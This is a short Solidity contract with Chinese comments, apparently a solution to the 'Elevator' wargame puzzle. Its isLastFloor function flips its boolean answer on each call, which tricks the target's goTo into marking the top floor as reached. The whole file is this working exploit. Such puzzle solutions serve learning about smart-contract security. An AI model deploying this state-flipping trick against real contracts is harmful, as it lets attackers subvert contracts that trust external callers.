// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// 定义目标合约接口
interface Elevator {
  function goTo(uint _floor) external;
}

contract Exploit {

    address public target; 
    uint256 public counter;

    constructor(address _target) {
        target = _target; 
    }

    // 实现目标合约代码中的接口
    // 每被调用一次，函数 bool 值就翻转一次
    function isLastFloor(uint256 _floor) public returns (bool){
      counter +=1 ;
      if(counter % 2 == 0){
        return true;
      }else{
         return false; 
      }   
    }

    // 本合约调用目标合约的函数 goTo(_floor)
    function attack(uint256 _floor) public{
        // 实例化目标合约的接口
        Elevator elevator = Elevator(target);
        elevator.goTo(_floor);
  }
}
